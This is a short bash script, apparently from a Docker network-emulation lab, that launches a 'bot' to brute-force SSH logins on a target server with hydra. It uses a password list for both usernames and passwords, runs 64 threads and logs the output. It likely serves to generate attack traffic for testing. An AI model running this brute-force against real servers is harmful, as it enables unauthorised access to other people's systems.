#!/bin/bash

log_dir="/var/log/dockemu"
log_file=${1:-"${RANDOM}"}

name=$log_file
log_file=${log_dir}/${log_file}.log

echo "LOGFILE:" $log_file

echo "[STARTING BOT: $name $(date +%D-%T) ]" | tee -a $log_file

sleep 1

hydra -L /passwords -V -P /passwords -t 64 $server ssh | tee -a $log_file && \


echo "[ENDING  $(date +%D-%T) ]" | tee -a $log_file
